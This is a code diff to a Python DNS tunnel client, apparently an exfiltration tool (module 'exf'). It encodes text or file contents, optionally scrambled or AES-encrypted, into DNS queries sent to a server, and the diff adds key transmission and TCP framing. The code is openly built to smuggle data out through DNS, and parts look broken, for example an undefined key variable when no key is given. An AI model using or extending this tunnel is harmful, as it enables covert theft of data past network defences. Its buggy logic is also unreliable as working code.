@@ -23,7 +23,7 @@ class Client():
         self.domain = args.domain
         self.qtype = args.qtype.upper()
         self.modes = (args.text, args.rand, args.file)
-        # self.key = (args.aes_key or args.scramble)
+        self.key = (args.aes_key or args.scramble)
         self.force_tcp = args.force_tcp
         
         try:
@@ -32,7 +32,6 @@ class Client():
             self.udp_sock.connect(self.addr)
 
             self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.tcp_sock.setblocking(True)
             self.tcp_sock.settimeout(self.timeout)
             self.tcp_sock.connect(self.addr)
 
@@ -41,13 +40,9 @@ class Client():
             self.tcp_sock.close()
             self.udp_sock.close()
             sys.exit(1)
-        
+
     def run(self):
         try:   
-            # if (self.key):
-            #     if (type(self.key) == list):
-            #         self.send_only(socket.SOCK_DGRAM, bytearray(self.key))
-           
             while True:
                 if (self.modes[0]):
                     data = self.read_text()
@@ -57,26 +52,34 @@ class Client():
                 elif (self.modes[2]):
                     data = self.read_file()
                 
-                old_hash = hashlib.sha256(data).digest()
+                old_hash = hashlib.sha1(data).digest()
 
-                queries = self.dns_ask(data, exf.scramble, (3, 11))
+                if (type(self.key) == list):
+                    queries = self.dns_ask(data, exf.scramble, self.key)
+                elif (type(self.key) == str):
+                    queries = self.dns_ask(data, exf.aes_encrypt, self.key)
+                else:
+                    queries = self.dns_ask(data, None)
                 
                 answers = []
                 for q in queries:
                     if (self.force_tcp):
-                        response = self.send_recv(socket.SOCK_STREAM, q)
+                        response = self.send_recv(self.tcp_sock, q)
                     else:
-                        response = self.send_recv(socket.SOCK_DGRAM, q)
+                        response = self.send_recv(self.udp_sock, q)
                     
                     if (response == b'tcp'):
-                        response = self.send_recv(socket.SOCK_STREAM, q)
+                        response = self.send_recv(self.tcp_sock, q)
                     answers += [response]
                
                 new_data = self.dns_extract(answers)
-                new_hash = hashlib.sha256(new_data).digest()
 
-                print("$", new_hash.hex(), new_hash == old_hash)
-                if (self.modes[2]): 
+                if (self.modes[0]):
+                    print("<", new_data.decode())
+                elif (self.modes[1]):
+                    new_hash = hashlib.sha1(new_data).digest()
+                    print("$", new_hash.hex(), new_hash == old_hash)
+                elif (self.modes[2]): 
                     with open('downloaded.txt', 'wb') as file:
                         file.write(new_data)
                     print("File downloaded.txt is saved!")
@@ -94,15 +97,18 @@ class Client():
             self.tcp_sock.close()
             self.udp_sock.close()
 
-    def send_recv(self, family, data=None):
-        if (family == socket.SOCK_DGRAM):
-            sock = self.udp_sock
+    def send_recv(self, sock, data=None):
+        if (sock is self.udp_sock):
+            dns_tcp_len = b''
         else:
-            sock = self.tcp_sock
+            dns_tcp_len = struct.pack("!H", len(data))
         
         if (data):
-            sock.send(data)
+            sock.send(dns_tcp_len + data)
         response = sock.recv(exf.SOCK_BUFFER_SIZE)
+
+        if (sock is self.tcp_sock):
+            response = response[2:]
         
         if not response:
             raise Exception('Error in getting a response!')
@@ -129,8 +135,20 @@ class Client():
         return whole
 
     def dns_ask(self, data, encrypt, *args):
-        enc_data = exf.domain_encode(data, self.domain, base64.urlsafe_b64encode, encrypt, *args)
-        queries = [dns.DNSRecord.question(i, self.qtype).pack() for i in enc_data]
+        enc_data = exf.domain_encode(data, self.domain,
+                                     base64.urlsafe_b64encode, encrypt, *args)
+
+        if (args[0]):
+            key = args[0].encode() if isinstance(args[0], str) else bytearray(args[0])
+            enc_key = exf.domain_encode(key, self.domain, 
+                                        base64.urlsafe_b64encode, exf.scramble, (4, 12))
+        
+        queries = []
+        for i in enc_data:
+            d = dns.DNSRecord.question(i, self.qtype)
+            d.add_question(dns.DNSQuestion(enc_key[0], dns.QTYPE.TXT))
+            queries += [d.pack()]
+        
         return queries
 
     def dns_extract(self, answers):
@@ -177,7 +195,7 @@ if __name__ == "__main__":
     
     parser.add_argument('-s', '--scramble', dest='scramble', type=int, nargs='+',
                         help='Scrambles outgoing traffic passing through the DNS tunnel.\n'+
-                            'You need to specify an offset, e.g. [3 11]')
+                            'You need to specify an offset, e.g. (3, 11)')
 
     parser.add_argument('-a', '--aes', dest='aes_key', type=str,
                         help='Encrypts with AES outgoing traffic passing through the DNS tunnel.\n'+
@@ -200,6 +218,10 @@ if __name__ == "__main__":
 
     if (args.scramble and len(args.scramble) > 2):
         parser.error('Only two values must be specified for the offset!')
+
+    if (args.aes_key):
+        if (len(args.aes_key) < 3):
+            parser.error('AES key is less than 3 characters long!')
 
     if (args.text):
         print("[Mode]", f"Sending text messages ...")
